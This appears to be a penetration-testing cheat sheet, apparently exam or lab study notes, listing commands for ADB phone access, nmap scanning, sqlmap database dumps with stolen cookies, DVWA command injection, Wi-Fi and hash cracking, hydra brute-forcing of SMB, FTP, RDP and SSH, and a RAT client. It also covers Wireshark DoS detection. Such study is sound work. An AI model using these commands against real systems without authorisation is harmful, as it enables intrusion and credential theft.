#### Mobile Device
  ```bash
  check for `port 5555` open
    - `adb connect <TIP>:5555`
    - `adb pull sdcard/`
    - `python3 phonesploitpro.py` → Use in interactive mode (`N` for next page, `P` for previous page)
  ```
```bash
- To Identity Servers run `nmap -A -oN` scans, then use `mousepad` for easy search
```
#### To Find Domain Controller
```bash
-  Check for **88/TCP** **kerberos-sec** and **port 389/TCP LDAP** opened which confirms that it is DC
    - Once Target is Found, Perform the Aggressive scan to get full details about the DC
```
#### To find Vulnerabilities(Vulnerability Scan) on Target Machine
```bash
    - `nmap -Pn --script vuln <TIP> -T5`
    - `openVAS` (if nmap fails)
```
#### SQL Injection
```bash
- SQLi → `sqlmap`
    - Go to view profile, get cookie by executing document.cookie in console.
```
#### Crack hashes
```bash
- hash crack → `online tools` or `hashcat/john`
```
#### DVWA
```bash
- DVWA Command execution `|<commands>`
    - `| type "path"` (to display content of file - windows)
    - `| cat "path"` (to display content of file - Linux)
```
#### Wireless (.cap)
```bash
- Cracking `.cap` → `aircrack-ng -w wordlist.txt capture.cap` or `aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap`
    - To fine the `bssid` given the .cap file `aircrack-ng <filename>.cap`
```
#### Vulnerabilities on domain
```bash
- Vulnerability Research  on the given domain use `dirb <targetDomain> -x eg.txt`
```
#### Malware Related
```bash
    - To access RAT → `Theef → Client210.exe` Tool (to get target IP, look for Target with `ports 9871, 6703` open)
    - To find Entry points, Linker info → `PEiD tool`
    - To find Entropy values
        - `DIE` → Windows (Can also be used to find segment sizes with different hashes)
        - `ent` → Linux
  ```
#### Wireshark
```bash
    - To find number of packets associated with IP → `statics -> filter by IPv4--> Source and Destination ---> Then you can apply the filter`
        - Eg: For highest no.of packets sent `tcp.flags.syn == 1 and tcp.flags.ack == 0` or filter my given `IP`
    - Filter with Frame Content → `frame contains "string"`
    - For Expert information `Analyse -> Expert Info`
    - IoT Publish Message use `mqtt` filter
    - Dos detection
        - Open connections
            - `tcp.flags.syn == 1 && tcp.flags.ack ==0`
            - `tcp.flags.syn == 1`
        - `Statistics → Conversations`, if no. of packets targeted on one IP from different source address and no reply back, it indicates DDoS
        - Detection with Graphs (`Statistics → I/O Graph Menu`) [ if there is a spike in overall packets then its a sus ]
```
#### PE Explorer
```bash
- Address of Entry or Entry point Address → `PE Explorer`
    - Entry Points → `DIE → PE` and cross check with `PEiD` (linker info)
```
#### Remote Logins
```bash
- Remote login possible ports `22, 23, 3389`
    - 22 → SSH
    - 23 → Telnet
    - 3389 → RDP
```
#### SMB
```bash
    - To crack credentials  `hydra -L users.txt -P pass.txt <TIP> smb -f`
    - To what target is share `smbmap -H <TIP>`  or `smbclient -L <tip>`
    - To get Data → `smbclient //<TIP>/directory`
    - To get files use `get <FileName>`
```
#### SSH
```bash
- SSH login `ssh user@<IP>`
    - Privilege Escalation → `sudo -i` → https://gtfobins.github.io/
```
#### FTP
```bash
- ftp login → `ftp <IP`
```
#### RDP login
```ssh
    - → `xfreerdp /v:<TIP> /u:username`
    - → rammina (simple tool)*
```
#### Hydra
```bash
    - `hydra -L users.txt -P passwords.txt ftp://<TIP> -f`
    - `hydra -L users.txt -P passwords.txt rdp://<TIP> -f`
    - `hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f`  → if not running on default port
```
#### CryptoForge
```bash
- `.cfe` → files encrypted used **cryptoForge**, to decrypt (`select file→right click→ decrypt`)
```
#### CRC32
```bash
- To find `crc32` use `HashMyfiles.exe`
```
#### Extract data from Image
```bash
- Extract data from image file (`OpenStego`, `steghide`)
```
#### Double encryption
```bash
- Double-Encryption → Decrypt with password and use hash crackers or tools (in windows or online)
```

#### Base64
```bash
    - `echo "aGVsbG8=" | base64 --decode`
    - `echo "aGVsbG8=" | base64 --d`
    - `base64 -d Sniff.txt > secret.txt`
    `cat secret.txt`
```
#### To find hash values
```bash
    - To `hash` multiple files at once in windows use `HashmyFiles` (also helps with `crc32` value)
    - `algorithmsum <file>`   eg. `sha256sum test.txt`
```
#### SQLi
    ```bash
    Click on View Profile > Copy the Url (save it in notepad) > Right click > Inspect element > console > document.cookie > Copy the Cookie value (save it in notepad). 
    
    sqlmap -u <url> --cookie <cookie value> --dbs
    
    sqlmap -u <url> --cookie <cookie value> -D dbName --tables 
    sqlmap -u <url> --cookie <cookie value> -D dbName -T Users_Login --dump
    ```
    
#### Wordpress
```bash
    - `wpscan -url <domain or ip>`
    - `wpscan -url <domain or ip> -U user -P pass.txt`
    - `wpscan -url <domain or ip> -e -u` → Enumerate Usernames.
```
